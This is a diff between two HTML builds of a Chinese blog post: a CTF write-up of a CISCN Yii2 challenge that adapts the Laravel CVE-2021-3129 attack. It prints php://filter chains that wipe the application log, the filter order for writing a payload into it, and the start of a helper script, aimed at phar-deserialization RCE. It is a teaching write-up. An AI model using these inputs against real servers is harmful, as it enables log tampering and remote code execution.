@@ -1,203 +1,244 @@
 <!DOCTYPE html>
-<html lang="en"><head>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>CISCN_web_filter - ?___?</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="通过国赛一道题来学习phar反序列化写日志到RCE" /><meta name="keywords" content='yii2, RCE' /><meta itemprop="name" content="CISCN_web_filter">
+<meta itemprop="description" content="通过国赛一道题来学习phar反序列化写日志到RCE"><meta itemprop="datePublished" content="2021-05-25T21:20:21+00:00" />
+<meta itemprop="dateModified" content="2021-05-25T21:20:21+00:00" />
+<meta itemprop="wordCount" content="1814"><meta itemprop="image" content="http://example.org/logo.png"/>
+<meta itemprop="keywords" content="yii2,RCE," /><meta property="og:title" content="CISCN_web_filter" />
+<meta property="og:description" content="通过国赛一道题来学习phar反序列化写日志到RCE" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/ciscn-web-filter/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-25T21:20:21+00:00" />
+<meta property="article:modified_time" content="2021-05-25T21:20:21+00:00" />
 
-    <style>
-        :root {
-            --accent-color: #08F;
-        }
-    </style>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
 
-    
-    
-    
-    
-    
-    
-
-    
-    <title>CISCN_web_filter</title>
-    <meta name="description" content="web security | code review">
-    <meta name="keywords" content='blog, gokarna, hugo, yii2, RCE'>
-
-    <meta property="og:url" content="https://nullarray.top/posts/ciscn-web-filter/">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="CISCN_web_filter">
-    <meta property="og:description" content="web security | code review">
-    <meta property="og:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="CISCN_web_filter">
-    <meta name="twitter:description" content="web security | code review">
-    <meta property="twitter:domain" content="https://nullarray.top/posts/ciscn-web-filter/">
-    <meta property="twitter:url" content="https://nullarray.top/posts/ciscn-web-filter/">
-    <meta name="twitter:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">
-
-    
-    <link rel="canonical" href="https://nullarray.top/posts/ciscn-web-filter/" />
-
-    <link rel="stylesheet" type="text/css" href="https://nullarray.top/css/normalize.min.css" media="print" onload="this.media='all'">
-    <link rel="stylesheet" type="text/css" href="https://nullarray.top/css/main.css">
-    <link disabled id="dark-theme" rel="stylesheet" href="https://nullarray.top/css/dark.css">
-
-    <script src="https://nullarray.top/js/svg-injector.min.js"></script>
-    <script src="https://nullarray.top/js/feather-icons.min.js"></script>
-    <script src="https://nullarray.top/js/main.js"></script>
-
-    
-    
-        <!-- KaTeX -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.css" integrity="sha384-6LkG2wmY8FK9E0vU9OOr8UvLwsaqUg9SETfpq4uTCN1agNe8HRdE9ABlk+fVx6gZ" crossorigin="anonymous">
-    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.js" integrity="sha384-31El76TwmbHj4rF9DyLsygbq6xoIobG0W+jqXim+a3dU9W53tdH3A/ngRPxOzzaB" crossorigin="anonymous"></script>
-    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
-        onload="renderMathInElement(document.body);"></script>
-  
-    
-</head>
-<body>
-        <script type="text/javascript">
-            
-            setThemeByUserPref();
-        </script><header class="header">
-    <nav class="header-nav">
-
-        
-        <div class="avatar">
-            <a href="https://nullarray.top">
-                <img src="https://i.loli.net/2021/05/27/iSZvInqMko5AT7C.jpg" alt="avatar" />
+<meta name="twitter:title" content="CISCN_web_filter"/>
+<meta name="twitter:description" content="通过国赛一道题来学习phar反序列化写日志到RCE"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/ciscn-web-filter/" /><link rel="next" href="http://example.org/posts/frp/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "CISCN_web_filter",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/example.org\/posts\/ciscn-web-filter\/"
+    },"genre": "posts","keywords": "yii2, RCE","wordcount":  1814 ,
+    "url": "http:\/\/example.org\/posts\/ciscn-web-filter\/","datePublished": "2021-05-25T21:20:21+00:00","dateModified": "2021-05-25T21:20:21+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "le3teq"
+      },"description": "通过国赛一道题来学习phar反序列化写日志到RCE"
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="?___?"
+    title="?___?"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-desktop" class="typeit header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
             </a>
-        </div>
-        
-
-        <div class="nav-title">
-            <a class="nav-brand" href="https://nullarray.top">le3teq&#39;s Blog</a>
-        </div>
-
-        <div class="nav-links">
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/"> Home </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/posts/"> Posts </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/projects/"> Projects </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/tags/"> Tags </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/lives/"> Lives </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top"><span data-feather='coffee'></span>  </a>
-            </div>
-            
-            <div class="nav-link">
-                <a href="https://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
-            </div>
-            
-
-            <span class="nav-icons-divider"></span>
-            <div class="nav-link dark-theme-toggle">
-                <a>
-                    <span id="theme-toggle-icon" data-feather="moon"></span>
-                </a>
-            </div>
-
-            <div class="nav-link" id="hamburger-menu-toggle">
-                <a>
-                    <span data-feather="menu"></span>
-                </a>
-            </div>
-
-            
-            <ul class="nav-hamburger-list visibility-hidden">
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/"> Home </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/posts/"> Posts </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/projects/"> Projects </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/tags/"> Tags </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/lives/"> Lives </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top"><span data-feather='coffee'></span>  </a>
-                </li>
-                
-                <li class="nav-item">
-                    <a href="https://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
-                </li>
-                
-                <li class="nav-item dark-theme-toggle">
-                    <a>
-                        <span id="theme-toggle-icon" data-feather="moon"></span>
-                    </a>
-                </li>
-            </ul>
-
-        </div>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
     </nav>
-</header>
-<main id="content">
-    <div class="post container">
-    <div class="post-header-section">
-        <h1>CISCN_web_filter</h1>
-        <small role="doc-subtitle"></small>
-        <p class="post-date">
-            May 25, 2021
-        </p>
-
-        <ul class="post-tags">
-        
-            <li class="post-tag"><a href="https://nullarray.top/tags/yii2">yii2</a></li>
-        
-            <li class="post-tag"><a href="https://nullarray.top/tags/rce">RCE</a></li>
-        
-        </ul>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="/fixit.min.svg"
+    title="/fixit.min.svg"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-mobile" class="typeit header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
     </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container-reverse" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
 
-    <div class="post-content">
-        <p>
-            <p>国赛的一道php://filter的过滤器利用，顺便学习一下laravel8的debug RCE</p>
-<h3 id="本地环境搭建">本地环境搭建</h3>
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span title="转载" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>CISCN_web_filter</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      le3teq</span></span>
+          <span class="post-category">收录于 <a href="/categories/ctf/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div>
+      <div class="post-meta-line"><span title=2021-05-25&#32;21:20:21><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-05-25">2021-05-25</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1814 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CISCN_web_filter">
+            <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="featured-image"><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png"
+    data-srcset="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png, https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png 1.5x, https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png 2x"
+    data-sizes="auto"
+    alt="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png"
+    title="通过国赛一道题来学习phar反序列化写日志到RCE"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#本地环境搭建">本地环境搭建</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#tips">tips</a></li>
+      </ul>
+    </li>
+    <li><a href="#后续-5-28">后续 5-28</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>国赛的一道php://filter的过滤器利用，顺便学习一下laravel8的debug RCE</p>
+<h2 id="本地环境搭建">本地环境搭建</h2>
 <p>mac下composer直接安装yii2</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>composer create-project --prefer-dist yiisoft/yii2-app-basic basic
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">composer create-project --prefer-dist yiisoft/yii2-app-basic basic
 </span></span></code></pre></div><p>题目给了<code>composer.json</code>和site控制器内容（应该，比较一下生成的yii2的<code>composer.json</code>文件，发现缺少monolog模块</p>
-<p><img src="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png" alt=""></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png"
+    data-srcset="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png, https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png 1.5x, https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png 2x"
+    data-sizes="auto"
+    alt="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png"
+    title="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png"/></p>
 <p>添加进项目中的<code>composer.json</code>，执行<code>composer update</code>即可安装缺少的日志模块。接着在config目录的<code>web.php</code>文件中设置日志级别（只需要error级别即可，方便后续利用</p>
-<p><img src="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png" alt=""></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png"
+    data-srcset="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png, https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png 1.5x, https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png 2x"
+    data-sizes="auto"
+    alt="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png"
+    title="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png"/></p>
 <p>最后把题目给的<code>SiteController.php</code>文件中的漏洞代码添加上去</p>
-<p><img src="imgs/duqoSB7DG1CiUwz.png" alt=""></p>
-<h3 id="利用">利用</h3>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png"
+    data-srcset="https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png, https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png 1.5x, https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png 2x"
+    data-sizes="auto"
+    alt="https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png"
+    title="https://s2.loli.net/2022/12/26/RAmQPLIUd4OVSEX.png"/></p>
+<h2 id="利用">利用</h2>
 <p>根据添加的代码我们能发现这就是<code>laravel8</code>的RCE的简化版，没有了代码审计流程，直接给了漏洞点。根据漏洞利用过程，简化为四步。</p>
 <ol>
 <li><strong>清空日志</strong></li>
@@ -206,105 +247,154 @@
 <li><strong>利用phar协议getshell</strong></li>
 </ol>
 <p>先进行日志清除，对于yii2的日志跟进前面的日志文件方法</p>
-<p><img src="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png" alt=""></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png"
+    data-srcset="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png, https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png 1.5x, https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png 2x"
+    data-sizes="auto"
+    alt="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png"
+    title="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png"/></p>
 <p>找到日志位置 <code>/runtime/logs/app.log</code></p>
 <p>先进行日志清除，这里使用consumed过滤器，用来清除文件内容，具体作用官方并未公开细节。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php://filter/read<span style="color:#ff79c6">=</span>consumed/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php://filter/read<span class="o">=</span>consumed/resource<span class="o">=</span>../runtime/logs/app.log
 </span></span></code></pre></div><p>根据<code>Laravel8</code>的RCE还可以用</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php://filter/write<span style="color:#ff79c6">=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php://filter/write<span class="o">=</span>convert.iconv.utf-8.utf-16be<span class="p">|</span>convert.quoted-printable-encode<span class="p">|</span>convert.iconv.utf-16be.utf-8<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>../runtime/logs/app.log
 </span></span></code></pre></div><p>来清除日志，主要利用思路是将文件内容变为非base64字符，然后使用<code>convert.base64-decode</code>过滤器来进行解密，这样就会达到清空目的，具体细节参考</p>
-<p><a href="https://xz.aliyun.com/t/9030#toc-4">Laravel Debug mode RCE（CVE-2021-3129）分析复现</a></p>
+<p><a href="https://xz.aliyun.com/t/9030#toc-4"target="_blank" rel="external nofollow noopener noreferrer">Laravel Debug mode RCE（CVE-2021-3129）分析复现</a></p>
 <p>接着是写入恶意<strong>payload</strong>，通过前面文章的分析复现我们可以知道，写入payload后日志格式为</p>
 <pre tabindex="0"><code>[x]payload [x]payload [x]部分payload
 </code></pre><p>也就是两部分完整payload和一部分残缺的payload，这里看看我们<strong>yii2</strong>下面的日志格式。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
-</span></span><span style="display:flex;"><span>Stack trace:
-</span></span><span style="display:flex;"><span>#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
-</span></span><span style="display:flex;"><span>#1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
-</span></span><span style="display:flex;"><span>#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()
-</span></span><span style="display:flex;"><span>#3 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array(Array, Array)
-</span></span><span style="display:flex;"><span>#4 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)
-</span></span><span style="display:flex;"><span>#5 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Module.php(534): yii\base\Controller-&gt;runAction(&#39;&#39;, Array)
-</span></span><span style="display:flex;"><span>#6 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/web/Application.php(104): yii\base\Module-&gt;runAction(&#39;&#39;, Array)
-</span></span><span style="display:flex;"><span>#7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
-</span></span><span style="display:flex;"><span>#8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
-</span></span><span style="display:flex;"><span>#9 {main}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
+</span></span><span class="line"><span class="cl">Stack trace:
+</span></span><span class="line"><span class="cl">#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
+</span></span><span class="line"><span class="cl">#1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
+</span></span><span class="line"><span class="cl">#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()
+</span></span><span class="line"><span class="cl">#3 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array(Array, Array)
+</span></span><span class="line"><span class="cl">#4 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)
+</span></span><span class="line"><span class="cl">#5 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Module.php(534): yii\base\Controller-&gt;runAction(&#39;&#39;, Array)
+</span></span><span class="line"><span class="cl">#6 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/web/Application.php(104): yii\base\Module-&gt;runAction(&#39;&#39;, Array)
+</span></span><span class="line"><span class="cl">#7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
+</span></span><span class="line"><span class="cl">#8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
+</span></span><span class="line"><span class="cl">#9 {main}
 </span></span></code></pre></div><p>可以看到其实只有两部分payload，也就是</p>
 <pre tabindex="0"><code>[x]payload [x]部分payload
 </code></pre><p>格式会影响我们写入payload，我们先尝试写普通字符，通过原作者提出的<code>convert.iconv.utf-16le.utf-8</code>方法，以及前面清空日志的过程，我们可以将写入payload中使用过滤器的顺序表示为</p>
 <p><strong>convert.quoted-printable-decode</strong> - &gt; <strong>convert.iconv.utf-16le.utf-8</strong> -&gt; <strong>convert.base64-decode</strong></p>
 <p>这其实就是一个日志清除的简化版，不过在<strong>utf-16le.utf-8</strong>过滤器使用的时候是每次对两个字符进行识别，所以在两部分完整payload的时候会清除失败，对于部分payload的情况有50%机率成功。</p>
 <p>通过上面这个链，我们需要构造反向链即可写入任意字符，也就是base64加密后符合<code>utf-16le.utf-8</code>以及<code>quoted-printable-decode</code>解密，base64我们能实现，<code>utf-16le.utf-8</code>参考官方文档</p>
-<p><img src="https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png" alt="image-20210528111652761"></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png"
+    data-srcset="https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png, https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png 1.5x, https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png 2x"
+    data-sizes="auto"
+    alt="image-20210528111652761"
+    title="image-20210528111652761"/></p>
 <p>也就是在字符和字符之间添加了<code>\0</code>，而<code>quote-printable</code>则是转成<code>=</code> +  ASCII码</p>
-<p><img src="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png" alt="image-20210528112030143"></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png"
+    data-srcset="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png, https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png 1.5x, https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png 2x"
+    data-sizes="auto"
+    alt="image-20210528112030143"
+    title="image-20210528112030143"/></p>
 <p>参考上面文章的生成符合链字符的脚本</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>res <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">&#39;xxxxx&#39;</span>)
